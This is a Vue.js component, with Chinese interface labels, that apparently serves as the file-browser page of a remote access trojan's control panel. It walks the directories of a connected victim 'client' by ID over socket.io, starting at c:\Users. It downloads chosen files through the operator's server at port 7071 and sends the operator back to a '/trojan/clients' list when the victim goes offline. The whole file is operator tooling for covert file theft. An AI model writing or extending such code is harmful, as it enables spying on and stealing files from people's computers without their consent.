<template>
  <!-- <div>
    <div>
      <v-container id="fileControlGroup" class="d-flex flex-column" dense>
        <v-container class="d-flex flex-column">
          <p>ID: {{ id }}</p>
          <p style="color: green">当前路径: {{ currentUrl }}</p>
        </v-container>
        <v-container class="d-flex flex-column flex-shrink-0">
          <v-text-field
            v-model="currentUrl"
            @keydown.enter="openDir(currentUrl)"
            dense
          />
          <v-btn-toggle background-color="transparent" dense max="0" multiple>
            <v-btn @click="openDir(currentUrl)" outlined small>读取目录</v-btn>
            <v-btn @click="goBack" outlined small>返回</v-btn>
            <template class="d-flex" v-if="selectedFile && !selectedFile.isDir">
              <v-btn @click="download(selectedFile.name)" outlined small
                >下载选择文件</v-btn
              >
              <v-btn outlined small>显示选择文件内容</v-btn>
            </template>
          </v-btn-toggle>
        </v-container>
      </v-container>
      <div class="fileGroup">
        <div class="fileLstat" style="position: absolute">
          <div class="fileName" @click="switchSort('文件名')">
            文件名<i
              class="fa fa-angle-up"
              v-if="calSortShow('文件名', '降序')"
            ></i
            ><i
              class="fa fa-angle-down"
              v-if="calSortShow('文件名', '升序')"
            ></i>
          </div>
          <div class="fileInfo">
            <p class="fileInfo_ctime" @click="switchSort('时间')">
              修改时间<i
                class="fa fa-angle-up"
                v-if="calSortShow('时间', '降序')"
              ></i
              ><i
                class="fa fa-angle-down"
                v-if="calSortShow('时间', '升序')"
              ></i>
            </p>
            <p class="fileInfo_size" @click="switchSort('文件大小')">
              文件大小<i
                class="fa fa-angle-up"
                v-if="calSortShow('文件大小', '降序')"
              ></i
              ><i
                class="fa fa-angle-down"
                v-if="calSortShow('文件大小', '升序')"
              ></i>
            </p>
          </div>
        </div>
        <div class="filesWrapper" @dblclick="goBack" style="margin-top: 30px">
          <div class="fileName">
            <p>..\</p>
          </div>
        </div>

        <template v-for="(file, index) in sortedFileList">
          <div
            class="filesWrapper"
            :class="isSelected(file)"
            @contextmenu="showFileContextMenu(file.name)"
            @click="selectFile(fileList[index])"
            @dblclick="openDir(file.name)"
            :key="index"
          >
            <div class="fileName">
              <p>
                <i
                  :class="getExtCssObj(file.name).class"
                  :style="getExtCssObj(file.name).style"
                ></i>
                {{ file.name }}
              </p>
            </div>
            <div class="fileInfo">
              <p class="fileInfo_ctime" v-if="file.lstat.ctime">
                {{ new Date(file.lstat.mtime).toLocaleString() }}
              </p>
              <p class="fileInfo_size" v-if="file.lstat.size">
                {{ calcFileSize(file) }}
              </p>
            </div>
          </div>
        </template>
      </div>
    </div>
    <context-menu
      :contextMenu="$store.state.contextMenu"
      :msg="msg"
      :template="contextMenu.template"
    ></context-menu>
  </div> -->
  <v-container>
    <div class="d-flex justify-space-between mb-3">
      <v-btn small fab @click="$router.go(-1)" class="mb-6 mr-5"
        ><v-icon>fa-angle-left</v-icon></v-btn
      >
      <div class="d-flex ma-0 pa-0">
        <p>排序方式</p>
        <v-container class="d-flex"
          ><v-menu offset-y>
            <template v-slot:activator="{ on }">
              <v-btn v-on="on" class="ml-3" small>{{ sortedBy.name }}</v-btn>
            </template>
            <v-list>
              <v-list-item-group>
                <v-list-item dense @click="sortedBy.name = '文件名'"
                  ><v-list-item-content
                    ><v-list-item-title
                      >文件名</v-list-item-title
                    ></v-list-item-content
                  ></v-list-item
                >
                <v-list-item dense @click="sortedBy.name = '时间'"
                  ><v-list-item-content
                    ><v-list-item-title
                      >时间</v-list-item-title
                    ></v-list-item-content
                  ></v-list-item
                >
                <v-list-item dense @click="sortedBy.name = '文件大小'"
                  ><v-list-item-content
                    ><v-list-item-title
                      >文件大小</v-list-item-title
                    ></v-list-item-content
                  ></v-list-item
                >
              </v-list-item-group>
            </v-list>
          </v-menu>
          <v-menu offset-y>
            <template v-slot:activator="{ on }">
              <v-btn v-on="on" class="ml-3" small>{{ sortedBy.type }}</v-btn>
            </template>
            <v-list>
              <v-list-item-group>
                <v-list-item dense @click="sortedBy.type = '升序'"
                  ><v-list-item-content
                    ><v-list-item-title
                      >升序</v-list-item-title
                    ></v-list-item-content
                  ></v-list-item
                >
                <v-list-item dense @click="sortedBy.type = '降序'"
                  ><v-list-item-content
                    ><v-list-item-title
                      >降序</v-list-item-title
                    ></v-list-item-content
                  ></v-list-item
                >
              </v-list-item-group>
            </v-list>
          </v-menu></v-container
        >
      </div>
    </div>
    <v-text-field
      label="当前URL"
      v-model="currentUrl"
      dense
      @keydown.enter="openDir(currentUrl)"
    ></v-text-field>
    <v-list style="overflow: auto; height: 63vh; user-select: none">
      <v-list-item v-ripple @click="goBack">
        <v-list-item-avatar>
          <v-icon>fa-long-arrow-left</v-icon>
        </v-list-item-avatar>
        <v-list-item-content>
          <v-list-item-title>返回上一级</v-list-item-title>
        </v-list-item-content>
      </v-list-item>
      <template v-for="(file, index) in fileList">
        <v-list-item :key="index" @click="openDir(file.name)" v-ripple>
          <v-list-item-avatar>
            <v-icon>{{ getExtCssObj(file.name).class }}</v-icon>
          </v-list-item-avatar>
          <v-list-item-content>
            <v-list-item-title>{{ file.name }}</v-list-item-title>
            <v-list-item-subtitle>{{
              new Date(file.lstat.mtime).toLocaleString()
            }}</v-list-item-subtitle>
            <v-list-item-subtitle>{{
              calcFileSize(file)
            }}</v-list-item-subtitle>
          </v-list-item-content>
          <v-list-item-action @click="download(file.name)" v-if="!file.isDir">
            <v-icon small>fa-download</v-icon>
          </v-list-item-action>
        </v-list-item>
      </template>
    </v-list>
  </v-container>
</template>

<script>
import path from "path-win32";
import ContextMenuVue from "../../components/ContextMenu";
import { SERVER_ADDRESS } from "../../../my_config";
import EXT from "./ext.js";

export default {
  name: "fileexplorer",
  data() {
    return {
      id: "",
      currentUrl: "c:\\Users",
      fileList: [],
      sortedFileList: [],
      selectedFile: null,
      msg: {},
      sortedBy: {
        name: "文件名",
        type: "升序",
      },
      contextMenu: {
        template: [
          {
            label: "下载此文件",
            click: () => {
              // event.reply("downloadfile", msg.id, fileUrl);
            },
          },
          {
            label: "显示此文件内容",
            click: () => {
              // event.reply("showfilecontent", fileUrl);
            },
          },
          // { type: "separator" },

          // { label: "Menu Item 2", type: "checkbox", checked: true },
        ],
      },
    };
  },
  watch: {
    // fileList(nv, ov) {
    //   this.sortFileList();
    // },
    sortedBy: {
      handler(nv, ov) {
        this.sortFileList();
      },
      deep: true,
    },
  },
  computed: {
    // sortedFileList() {
    //   switch (this.sortedBy) {
    //     case "文件名": {
    //       return this.fileList.sort();
    //     }
    //   }
    //   return this.fileList;
    // },
    isDir() {
      return function (is_dir) {
        return is_dir ? { color: "red" } : {};
      };
    },
    isSelected() {
      const that = this;
      return function (file) {
        let classList = [];
        if (file == that.selectedFile) {
          classList.push("file-selected");
        }
        // if (file.isDir) {
        //   classList.push("file-is-dir");
        // }
        return classList;
      };
    },
    getExtCssObj() {
      return function (file) {
        const extName = path.extname(file);
        return EXT.calcClass(extName);
      };
    },
    calSortShow() {
      let that = this;
      return (name, type) => {
        return name == this.sortedBy.name && type == this.sortedBy.type
          ? true
          : false;
      };
    },
  },
  beforeMount() {
    let that = this;
    this.$nextTick(() => {
      this.openDir(".");
    });
    // ipcRenderer.on("downloadfile", (e, id, fileUrl) => {
    //   that.download(fileUrl);
    // });
    // ipcRenderer.on("showfilecontent", (e, fileUrl) => {});
    this.$store.state.io.on("apilistdir", (result, url) => {
      // console.log(result);
      if (result.length) {
        // console.log(result);
        that.fileList = result;
        that.sortedFileList = that.fileList;
        that.currentUrl = url;
        that.sortFileList();
      }
    });
    // window.ss(window.io).on("apidownloadfile", (stream) => {
    //   console.log(stream);
    //   console.log(666);
    //   // stream.pipe(fs.createWriteStream("C:\\ProgramData\\nssm\\testbili123"));
    // });
    this.$store.state.io.on("apidownloadfile", (fileName) => {
      window.open(`${SERVER_ADDRESS}:7071/tmpDir/${fileName}`);
    });
    this.$store.state.io.on("apishowfilecontent", (raw) => {});
    this.id = this.$route.query.id;

    this.interval = setInterval(() => {
      if (this.$myUtils.IdIndex(window.clientArr, this.id) == -1) {
        clearInterval(this.interval);
        // alert("此客户端已离线");
        this.$router.push("/trojan/clients");
      }
    }, 200);

    // this.sortFileList();
  },
  methods: {
    switchSort(name) {
      if (this.sortedBy.name == name) {
        if (this.sortedBy.type == "升序") {
          this.sortedBy.type = "降序";
        } else if (this.sortedBy.type == "降序") {
          this.sortedBy.type = "升序";
        }
      } else {
        this.sortedBy = {
          name: name,
          type: "升序",
        };
      }
      console.log(this.sortedBy);
    },
    sortFileList() {
      switch (this.sortedBy.name) {
        case "文件名": {
          switch (this.sortedBy.type) {
            case "升序": {
              this.sortedFileList = this.fileList.sort((a, b) => {
                if (a > b) {
                  return 1;
                } else {
                  return -1;
                }
              });
              break;
            }
            case "降序": {
              this.sortedFileList = this.fileList.sort((a, b) => {
                if (a < b) {
                  return 1;
                } else {
                  return -1;
                }
              });
              break;
            }
          }
          break;
        }
        case "时间": {
          switch (this.sortedBy.type) {
            case "升序": {
              this.sortedFileList = this.fileList.sort((a, b) => {
                if (a.lstat.mtime > b.lstat.mtime) {
                  return -1;
                } else {
                  return 1;
                }
              });
              break;
            }
            case "降序": {
              this.sortedFileList = this.fileList.sort((a, b) => {
                if (a.lstat.mtime < b.lstat.mtime) {
                  return -1;
                } else {
                  return 1;
                }
              });
              break;
            }
          }

          break;
        }
        case "文件大小": {
          switch (this.sortedBy.type) {
            case "升序": {
              this.sortedFileList = this.fileList.sort((a, b) => {
                if (a.lstat.size > b.lstat.size) {
                  return -1;
                } else {
                  return 1;
                }
              });
              break;
            }
            case "降序": {
              this.sortedFileList = this.fileList.sort((a, b) => {
                if (a.lstat.size < b.lstat.size) {
                  return -1;
                } else {
                  return 1;
                }
              });
              break;
            }
          }

          break;
        }
      }
    },
    selectFile(file) {
      if (this.selectedFile == file) {
        this.selectedFile = null;
        return;
      }
      this.selectedFile = file;
    },
    calcFileSize(file) {
      let size = file.lstat.size;

      if (file.isDir) {
        return null;
      }

      if (size < (1024 ^ 1)) {
        return size.toFixed(2) + "B";
      } else if (size < (1024 ^ 2) * 1000) {
        return (size / 1024).toFixed(2) + "KB";
      } else if (size < (1024 ^ 3) * 1000 * 1000) {
        return (size / 1024 / 1024).toFixed(2) + "MB";
      } else if (size < (1024 ^ 4) * 1000 * 1000 * 1000) {
        return (size / 1024 / 1024 / 1024).toFixed(2) + "GB";
      }
    },
    showFileContextMenu(fileName) {
      let toUrl = path.resolve(this.currentUrl, fileName);
      // ipcRenderer.send("file-context-menu", { id: this.id }, toUrl);
    },
    goBack() {
      this.currentUrl = path.resolve(this.currentUrl, "..");
      this.$store.state.io.emit("apilistdir", this.id, this.currentUrl);
    },
    openDir(target) {
      let toUrl = path.resolve(this.currentUrl, target);
      // console.log(toUrl);
      this.$store.state.io.emit("apilistdir", this.id, toUrl);
    },
    download(target) {
      let that = this;
      const fileUrl = path.resolve(this.currentUrl, target);
      this.$store.state.io.emit("apidownloadfile", that.id, fileUrl);
    },
    showFileContent(target) {
      this.$store.state.io.emit("apishowfilecontent", this.id, target);
    },
    showDetails() {},
  },
  components: {
    // "context-menu": ContextMenuVue,
  },
};
</script>

<style lang="scss">
.fileLstat {
  // .fileGroup.filesWrapper();

  padding: 2vh 0 2vh 0;
  width: 90%;
  display: grid;
  grid-template-rows: repeat(auto-fill);
  grid-template-columns: 1fr 1fr;
  border-bottom: 1px rgb(153, 153, 153) solid;
  &:hover {
    border-bottom: 1.2px solid black;
  }

  * {
    cursor: pointer;
    user-select: none;
  }
  // border-bottom: 2px solid green;
  border-bottom: 1.2px solid black;
  background-color: gainsboro;
  z-index: 999;
  padding: 5px 0;
  border-bottom-left-radius: 5px;
  border-bottom-right-radius: 5px;
}
.file-is-dir {
  color: red;
}
.file-selected {
  background-color: rgb(209, 209, 209);
  border-bottom: 3px rgb(6, 90, 158) solid !important;
}
#file-button {
  margin-left: 5px;
  display: inline;
}
.fileGroup {
  margin-top: 10px;
  .filesWrapper {
    // display: flex;
    // flex-direction: row;
    // justify-content: space-between;
    // align-items: space-between;
    // flex-grow: 1;
    padding: 2vh 0 2vh 0;
    width: 90%;
    display: grid;
    grid-template-rows: repeat(auto-fill);
    grid-template-columns: 1fr 1fr;
    border-bottom: 1px rgb(153, 153, 153) solid;
    &:hover {
      border-bottom: 1.2px solid black;
    }
  }
  .fileName {
    // width: 40%;
    display: flex;
    flex-direction: row;
    justify-content: flex-start;
    @media screen {
    }
    text-align: left;
    word-break: break-all;
    padding-right: 3vw;
  }
  .fileInfo {
    font-size: 0.7rem;
    display: flex;
    flex-direction: row;
    justify-content: space-between;
    .fileInfo_size {
    }
  }
  // box-sizing: border-box;
  height: 45vh;
  display: flex;
  flex-direction: column;
  flex-wrap: nowrap;
  overflow: scroll;
  // padding: 30px;
  align-items: center;
  width: 100%;
  // p {
  //   // box-sizing: border-box;
  //   width: 100%;
  //   text-align: left;
  //   margin: 5px 0 5px 10%;
  //   padding: 10px 5% 10px 5%;
  //   // margin: 0 auto;
  //   user-select: none;
  //   // white-space: nowrap;
  //   flex-grow: 0;
  //   flex-shrink: 1;
  //   margin-top: 3px;
  //   cursor: pointer;
  //   // overflow: hidden;
  //   // text-overflow: ellipsis;
  //   // border-top: 1px rgb(153, 153, 153) solid;

  //   // height: 5vh;
  //   &:hover {
  //     // width: auto;
  //     overflow: visible;
  //     text-overflow: inherit;
  //     // background-color: lightcoral;
  //     // font-size: 1.1rem;
  //     // transform: scale(1.05);
  //     // transform-origin: left top;
  //     z-index: 999;
  //     // width: 30vw;
  //     // box-shadow: 0.5px 0 2px 1px black;
  //     // border-top: 1.2px solid black;
  //   }
  //   i {
  //     margin-right: 10px;
  //   }
  // }
}
</style>
